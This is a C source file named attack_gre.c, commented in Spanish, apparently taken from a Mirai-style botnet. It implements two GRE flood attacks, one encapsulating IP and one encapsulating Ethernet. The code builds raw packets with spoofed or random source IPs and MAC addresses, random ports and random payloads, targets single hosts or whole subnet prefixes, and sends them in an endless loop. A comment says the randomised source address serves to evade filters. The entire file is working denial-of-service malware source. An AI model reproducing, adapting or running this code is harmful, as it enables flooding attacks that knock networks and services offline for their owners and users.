/***************************************************************************
 * Archivo: attack_gre.c
 * 
 * Descripción: Implementación de ataques GRE (Generic Routing Encapsulation)
 * Este módulo implementa dos tipos de ataques usando el protocolo GRE:
 * 1. GRE sobre IP - Encapsula paquetes IP dentro de GRE
 * 2. GRE sobre Ethernet - Encapsula tramas Ethernet dentro de GRE
 * 
 * Funcionalidades principales:
 * - Generación de paquetes GRE malformados
 * - Inundación con tráfico GRE encapsulado
 * - Spoofing de direcciones IP y MAC
 * - Payload aleatorio o personalizado
 * 
 * Referencias:
 * - RFC 2784 (GRE)
 * - RFC 2890 (Key and Sequence Number Extensions)
 ***************************************************************************/

/* Habilitar extensiones GNU */
#define _GNU_SOURCE

/* Cabeceras del sistema */
#ifdef DEBUG
#include <stdio.h>     /* printf() - Solo para depuración */
#endif
#include <stdlib.h>    /* malloc(), free(), etc */
#include <unistd.h>    /* close() */
#include <sys/socket.h> /* socket(), setsockopt() */
#include <linux/ip.h>  /* struct iphdr */
#include <linux/if_ether.h> /* struct ethhdr */
#include <errno.h>     /* errno, códigos de error */

/* Cabeceras locales */
#include "includes.h"  /* Definiciones comunes */
#include "attack.h"    /* Estructuras de ataque */
#include "protocol.h"  /* Constantes de protocolos */
#include "util.h"      /* Funciones de utilidad */
#include "checksum.h"  /* Cálculo de checksums */
#include "rand.h"      /* Generación de números aleatorios */

/*
 * Función de Ataque GRE sobre IP
 * 
 * Implementa un ataque de inundación usando GRE para encapsular paquetes IP.
 * El ataque construye paquetes con la siguiente estructura:
 * [IP Header][GRE Header][IP Header][UDP Header][Payload]
 *
 * Características del ataque:
 * - Encapsulación IP sobre GRE
 * - Spoofing de IP origen/destino
 * - Payload aleatorio o personalizado
 * - Soporte para ataques a subredes (/24, /16, etc)
 * - Control de fragmentación IP
 * 
 * @param targs_len   Número de objetivos
 * @param targs       Array de objetivos con IPs/puertos
 * @param opts_len    Número de opciones
 * @param opts        Array de opciones para el ataque
 */
void attack_gre_ip(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    /* Variables de control */
    int i, fd;
    
    /* Asignar memoria para array de paquetes */
    char **pkts = calloc(targs_len, sizeof (char *));
    
    /* Obtener opciones del ataque
     * - ip_tos: Tipo de servicio IP
     * - ip_ident: Identificador de paquete IP
     * - ip_ttl: Time to live
     * - dont_frag: No fragmentar paquete
     * - sport/dport: Puertos origen/destino
     * - data_len: Tamaño del payload
     * - data_rand: Payload aleatorio
     * - gcip: IP constante en GRE
     * - source_ip: IP origen (spoof)
     */
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, TRUE);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    int data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 512);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
    BOOL gcip = attack_get_opt_int(opts_len, opts, ATK_OPT_GRE_CONSTIP, FALSE);
    uint32_t source_ip = attack_get_opt_int(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);

    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
#ifdef DEBUG
        printf("Failed to create raw socket. Aborting attack\n");
#endif
        return;
    }
    i = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
    {
#ifdef DEBUG
        printf("Failed to set IP_HDRINCL. Aborting\n");
#endif
        close(fd);
        return;
    }

    /* Inicializar buffer de paquetes para cada objetivo
     * Estructura del paquete GRE-IP:
     * [IP Header] -> [GRE Header] -> [IP Header] -> [UDP Header] -> [Payload]
     */
    for (i = 0; i < targs_len; i++)
    {
        /* Punteros a las diferentes cabeceras del paquete */
        struct iphdr *iph;      /* Cabecera IP externa */
        struct grehdr *greh;    /* Cabecera GRE */
        struct iphdr *greiph;   /* Cabecera IP encapsulada */
        struct udphdr *udph;    /* Cabecera UDP encapsulada */

        /* Asignar memoria para el paquete completo (1510 bytes máximo) */
        pkts[i] = calloc(1510, sizeof (char *));
        
        /* Configurar punteros a cada sección del paquete
         * - iph: Inicio del paquete
         * - greh: Después de IP externa
         * - greiph: Después de GRE
         * - udph: Después de IP interna
         */
        iph = (struct iphdr *)(pkts[i]);
        greh = (struct grehdr *)(iph + 1);
        greiph = (struct iphdr *)(greh + 1);
        udph = (struct udphdr *)(greiph + 1);

        /* Inicialización de la cabecera IP externa
         * Esta cabecera envuelve todo el paquete GRE
         */
        iph->version = 4;                  /* IPv4 */
        iph->ihl = 5;                      /* Tamaño: 5 x 4 = 20 bytes */
        iph->tos = ip_tos;                 /* Tipo de servicio */
        /* Longitud total: suma de todas las cabeceras + datos */
        iph->tot_len = htons(sizeof (struct iphdr) + 
                            sizeof (struct grehdr) + 
                            sizeof (struct iphdr) + 
                            sizeof (struct udphdr) + 
                            data_len);
        iph->id = htons(ip_ident);         /* ID del paquete */
        iph->ttl = ip_ttl;                 /* Time To Live */
        if (dont_frag)
            iph->frag_off = htons(1 << 14);/* Flag Don't Fragment */
        iph->protocol = IPPROTO_GRE;       /* Protocolo: GRE */
        iph->saddr = source_ip;            /* IP origen (puede ser spoofeada) */
        iph->daddr = targs[i].addr;        /* IP destino del objetivo */

        /* Inicialización de la cabecera GRE
         * Especifica el protocolo encapsulado (IP en este caso)
         */
        greh->protocol = htons(ETH_P_IP);  /* Protocolo: IPv4 (0x0800) */

        /* Inicialización de la cabecera IP encapsulada
         * Esta es la cabecera IP que va dentro del túnel GRE
         */
        greiph->version = 4;               /* IPv4 */
        greiph->ihl = 5;                   /* Tamaño: 5 x 4 = 20 bytes */
        greiph->tos = ip_tos;              /* Mismo ToS que exterior */
        /* Longitud: cabecera IP + UDP + datos */
        greiph->tot_len = htons(sizeof (struct iphdr) + 
                               sizeof (struct udphdr) + 
                               data_len);
        greiph->id = htons(~ip_ident);     /* ID inverso al exterior */
        greiph->ttl = ip_ttl;              /* Mismo TTL que exterior */
        if (dont_frag)
            greiph->frag_off = htons(1 << 14); /* No fragmentar */
        greiph->protocol = IPPROTO_UDP;    /* Protocolo: UDP */
        
        /* IPs origen/destino del paquete encapsulado
         * - Origen: aleatorio para evadir filtros
         * - Destino: igual al exterior o calculado
         */
        greiph->saddr = rand_next();       /* IP origen aleatoria */
        if (gcip)
            greiph->daddr = iph->daddr;    /* Misma IP destino que exterior */
        else
            greiph->daddr = ~(greiph->saddr - 1024); /* IP destino calculada */

        /* Inicialización de la cabecera UDP
         * UDP es el protocolo de la capa de transporte encapsulada
         */
        udph->source = htons(sport);      /* Puerto origen (puede ser aleatorio) */
        udph->dest = htons(dport);        /* Puerto destino (puede ser aleatorio) */
        udph->len = htons(sizeof (struct udphdr) + data_len); /* Longitud total UDP */
    }

    /* Bucle principal del ataque
     * Envía paquetes continuamente a todos los objetivos
     */
    while (TRUE)
    {
        /* Procesar cada objetivo en la lista */
        for (i = 0; i < targs_len; i++)
        {
            /* Obtener referencias a todas las partes del paquete
             * - pkt: Paquete completo
             * - iph: Cabecera IP externa
             * - greh: Cabecera GRE
             * - greiph: Cabecera IP interna
             * - udph: Cabecera UDP
             * - data: Payload
             */
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
            struct grehdr *greh = (struct grehdr *)(iph + 1);
            struct iphdr *greiph = (struct iphdr *)(greh + 1);
            struct udphdr *udph = (struct udphdr *)(greiph + 1);
            char *data = (char *)(udph + 1);

            // For prefix attacks
            if (targs[i].netmask < 32)
                iph->daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));

            if (source_ip == 0xffffffff)
                iph->saddr = rand_next();

            if (ip_ident == 0xffff)
            {
                iph->id = rand_next() & 0xffff;
                greiph->id = ~(iph->id - 1000);
            }
            if (sport == 0xffff)
                udph->source = rand_next() & 0xffff;
            if (dport == 0xffff)
                udph->dest = rand_next() & 0xffff;

            /* Actualizar IP destino interna según configuración
             * - Si !gcip: IP destino aleatoria
             * - Si gcip: Misma IP que el exterior
             */
            if (!gcip)
                greiph->daddr = rand_next();
            else
                greiph->daddr = iph->daddr;

            /* Generar payload aleatorio si está configurado */
            if (data_rand)
                rand_str(data, data_len);

            /* Calcular checksums de todas las cabeceras
             * 1. Checksum IP exterior:
             *    - Resetear campo check
             *    - Calcular sobre toda la cabecera IP
             */
            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));

            /* 2. Checksum IP interior:
             *    - Resetear campo check
             *    - Calcular sobre cabecera IP encapsulada
             */
            greiph->check = 0;
            greiph->check = checksum_generic((uint16_t *)greiph, sizeof (struct iphdr));

            /* 3. Checksum UDP:
             *    - Resetear campo check
             *    - Calcular usando pseudo-header IP
             *    - Incluir cabecera UDP y datos
             */
            udph->check = 0;
            udph->check = checksum_tcpudp(greiph, udph, udph->len, 
                                        sizeof (struct udphdr) + data_len);

            /* Configurar estructura sockaddr para envío
             * - Familia AF_INET para IPv4
             * - IP destino del paquete exterior
             * - Puerto 0 (no usado en raw sockets)
             */
            targs[i].sock_addr.sin_family = AF_INET;
            targs[i].sock_addr.sin_addr.s_addr = iph->daddr;
            targs[i].sock_addr.sin_port = 0;

            /* Enviar paquete usando socket raw
             * - Tamaño total: suma de todas las cabeceras y datos
             * - MSG_NOSIGNAL: No generar SIGPIPE si conexión cerrada
             */
            sendto(fd, pkt, 
                  sizeof (struct iphdr) +    /* IP exterior */
                  sizeof (struct grehdr) +   /* GRE */
                  sizeof (struct iphdr) +    /* IP interior */
                  sizeof (struct udphdr) +   /* UDP */
                  data_len,                  /* Payload */
                  MSG_NOSIGNAL, 
                  (struct sockaddr *)&targs[i].sock_addr,
                  sizeof (struct sockaddr_in));
        }

#ifdef DEBUG
        /* En modo debug:
         * - Mostrar errores si ocurren
         * - Salir después de un envío
         */
        if (errno != 0)
            printf("errno = %d\n", errno);
        break;
#endif
    }
}

/*
 * Función de Ataque GRE sobre Ethernet
 * 
 * Implementa un ataque de inundación usando GRE para encapsular tramas Ethernet.
 * El ataque construye paquetes con la siguiente estructura:
 * [IP Header][GRE Header][Ethernet Header][IP Header][UDP Header][Payload]
 *
 * Características específicas:
 * - Encapsulación Ethernet sobre GRE
 * - Spoofing de MAC e IP
 * - Soporte para ataques a subredes
 * - Payload personalizable
 * - Control de fragmentación
 * 
 * @param targs_len   Número de objetivos en el ataque
 * @param targs       Array de estructuras con datos de objetivos
 * @param opts_len    Número de opciones de ataque
 * @param opts        Array de estructuras con opciones
 */
void attack_gre_eth(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    /* Variables de control */
    int i, fd;
    
    /* Asignar memoria para array de paquetes */
    char **pkts = calloc(targs_len, sizeof (char *));
    
    /* Obtener opciones del ataque
     * Parámetros de la capa IP:
     * - ip_tos: Type of Service (prioridad/calidad)
     * - ip_ident: Identificador de fragmentación
     * - ip_ttl: Time To Live (máx. saltos)
     * - dont_frag: Flag Don't Fragment
     */
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, TRUE);

    /* Parámetros de la capa de transporte:
     * - sport: Puerto origen (puede ser aleatorio)
     * - dport: Puerto destino (puede ser aleatorio)
     */
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);

    /* Parámetros del payload y comportamiento:
     * - data_len: Tamaño del payload
     * - data_rand: Generar payload aleatorio
     * - gcip: Usar IP constante en GRE
     * - source_ip: IP origen (puede ser spoofeada)
     */
    int data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 512);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
    BOOL gcip = attack_get_opt_int(opts_len, opts, ATK_OPT_GRE_CONSTIP, FALSE);
    uint32_t source_ip = attack_get_opt_int(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);

    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
#ifdef DEBUG
        printf("Failed to create raw socket. Aborting attack\n");
#endif
        return;
    }
    i = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
    {
#ifdef DEBUG
        printf("Failed to set IP_HDRINCL. Aborting\n");
#endif
        close(fd);
        return;
    }

    /* Inicializar paquetes para cada objetivo
     * Estructura completa del paquete GRE-ETH:
     * [IP][GRE][ETH][IP][UDP][Data]
     */
    for (i = 0; i < targs_len; i++)
    {
        /* Punteros a las diferentes cabeceras del paquete
         * - iph: Cabecera IP externa para enrutamiento
         * - greh: Cabecera GRE para encapsulación
         * - ethh: Cabecera Ethernet encapsulada
         * - greiph: Cabecera IP dentro de Ethernet
         * - udph: Cabecera UDP del payload
         */
        struct iphdr *iph;
        struct grehdr *greh;
        struct ethhdr *ethh;
        struct iphdr *greiph;
        struct udphdr *udph;
        uint32_t ent1, ent2, ent3;  /* Para direcciones MAC aleatorias */

        /* Asignar memoria para el paquete completo (1510 bytes máx)
         * Tamaño máximo considerando todas las cabeceras y MTU
         */
        pkts[i] = calloc(1510, sizeof (char *));

        /* Configurar punteros a cada sección del paquete
         * Cada cabecera se ubica secuencialmente en memoria
         */
        iph = (struct iphdr *)(pkts[i]);            /* IP externa */
        greh = (struct grehdr *)(iph + 1);          /* GRE */
        ethh = (struct ethhdr *)(greh + 1);         /* Ethernet */
        greiph = (struct iphdr *)(ethh + 1);        /* IP interna */
        udph = (struct udphdr *)(greiph + 1);       /* UDP */

        /* Inicialización de la cabecera IP externa
         * Esta cabecera maneja el enrutamiento del paquete GRE
         */
        iph->version = 4;                  /* IPv4 */
        iph->ihl = 5;                      /* Longitud: 5 x 4 = 20 bytes */
        iph->tos = ip_tos;                 /* Tipo de servicio configurado */
        
        /* Longitud total del paquete
         * Suma de todas las cabeceras y datos:
         * IP + GRE + ETH + IP + UDP + payload
         */
        iph->tot_len = htons(sizeof (struct iphdr) + 
                            sizeof (struct grehdr) + 
                            sizeof (struct ethhdr) + 
                            sizeof (struct iphdr) + 
                            sizeof (struct udphdr) + 
                            data_len);
                            
        iph->id = htons(ip_ident);         /* ID de fragmentación */
        iph->ttl = ip_ttl;                 /* Time To Live */
        
        /* Configurar flag Don't Fragment si está habilitado */
        if (dont_frag)
            iph->frag_off = htons(1 << 14);
            
        iph->protocol = IPPROTO_GRE;       /* Protocolo: GRE */
        iph->saddr = source_ip;            /* IP origen (puede ser spoofeada) */
        iph->daddr = targs[i].addr;        /* IP destino del objetivo */

        /* Inicialización de la cabecera GRE
         * GRE encapsula tramas Ethernet completas
         */
        greh->protocol = htons(PROTO_GRE_TRANS_ETH); /* Protocolo: Ethernet */

        /* Inicialización de la cabecera Ethernet
         * Contiene la trama Ethernet encapsulada
         */
        ethh->h_proto = htons(ETH_P_IP);   /* Protocolo: IPv4 */

        /* Inicialización de la cabecera IP encapsulada
         * Esta es la cabecera IP dentro de la trama Ethernet
         */
        greiph->version = 4;               /* IPv4 */
        greiph->ihl = 5;                   /* Longitud: 5 x 4 = 20 bytes */
        greiph->tos = ip_tos;              /* Mismo ToS que exterior */
        
        /* Longitud del paquete interno:
         * IP + UDP + payload
         */
        greiph->tot_len = htons(sizeof (struct iphdr) + 
                               sizeof (struct udphdr) + 
                               data_len);
                               
        greiph->id = htons(~ip_ident);     /* ID inverso al exterior */
        greiph->ttl = ip_ttl;              /* Mismo TTL que exterior */
        
        /* Configurar flag Don't Fragment interno */
        if (dont_frag)
            greiph->frag_off = htons(1 << 14);
            
        greiph->protocol = IPPROTO_UDP;    /* Protocolo: UDP */
        greiph->saddr = rand_next();       /* IP origen aleatoria */
        
        /* IP destino interna según configuración
         * - Si gcip: misma que exterior
         * - Si !gcip: calculada desde origen
         */
        if (gcip)
            greiph->daddr = iph->daddr;
        else
            greiph->daddr = ~(greiph->saddr - 1024);

        // UDP header init
        udph->source = htons(sport);
        udph->dest = htons(dport);
        udph->len = htons(sizeof (struct udphdr) + data_len);
    }

    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
            struct grehdr *greh = (struct grehdr *)(iph + 1);
            struct ethhdr *ethh = (struct ethhdr *)(greh + 1);
            struct iphdr *greiph = (struct iphdr *)(ethh + 1);
            struct udphdr *udph = (struct udphdr *)(greiph + 1);
            char *data = (char *)(udph + 1);
            uint32_t ent1, ent2, ent3;

            // For prefix attacks
            if (targs[i].netmask < 32)
                iph->daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));

            if (source_ip == 0xffffffff)
                iph->saddr = rand_next();

            if (ip_ident == 0xffff)
            {
                iph->id = rand_next() & 0xffff;
                greiph->id = ~(iph->id - 1000);
            }
            if (sport == 0xffff)
                udph->source = rand_next() & 0xffff;
            if (dport == 0xffff)
                udph->dest = rand_next() & 0xffff;

            if (!gcip)
                greiph->daddr = rand_next();
            else
                greiph->daddr = iph->daddr;

            /* Generar direcciones MAC aleatorias para la trama Ethernet
             * Se usan 3 valores aleatorios para construir:
             * - MAC destino (6 bytes)
             * - MAC origen (6 bytes)
             */
            ent1 = rand_next();            /* Primeros 4 bytes MAC destino */
            ent2 = rand_next();            /* Primeros 4 bytes MAC origen */
            ent3 = rand_next();            /* Últimos 2 bytes para ambas */
            
            /* Copiar valores a los campos de la cabecera Ethernet
             * - h_dest: MAC destino (6 bytes)
             * - h_source: MAC origen (6 bytes)
             */
            util_memcpy(ethh->h_dest, (char *)&ent1, 4);      /* MAC dst [0-3] */
            util_memcpy(ethh->h_source, (char *)&ent2, 4);    /* MAC src [0-3] */
            util_memcpy(ethh->h_dest + 4, (char *)&ent3, 2);  /* MAC dst [4-5] */
            util_memcpy(ethh->h_source + 4, (((char *)&ent3)) + 2, 2); /* MAC src [4-5] */

            /* Generar payload aleatorio si está configurado */
            if (data_rand)
                rand_str(data, data_len);

            /* Calcular checksums de todas las cabeceras
             * 1. Checksum IP exterior:
             *    - Resetear campo check
             *    - Calcular sobre toda la cabecera IP
             */
            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));

            /* 2. Checksum IP interior:
             *    - Resetear campo check
             *    - Calcular sobre cabecera IP encapsulada
             */
            greiph->check = 0;
            greiph->check = checksum_generic((uint16_t *)greiph, sizeof (struct iphdr));

            /* 3. Checksum UDP:
             *    - Resetear campo check
             *    - Calcular usando pseudo-header IP
             *    - Incluir cabecera UDP y datos
             */
            udph->check = 0;
            udph->check = checksum_tcpudp(greiph, udph, udph->len, 
                                        sizeof (struct udphdr) + data_len);

            targs[i].sock_addr.sin_family = AF_INET;
            targs[i].sock_addr.sin_addr.s_addr = iph->daddr;
            targs[i].sock_addr.sin_port = 0;
            sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct grehdr) + sizeof (struct ethhdr) + sizeof (struct iphdr) + sizeof (struct udphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
        }

#ifdef DEBUG
        if (errno != 0)
            printf("errno = %d\n", errno);
        break;
#endif
    }
}
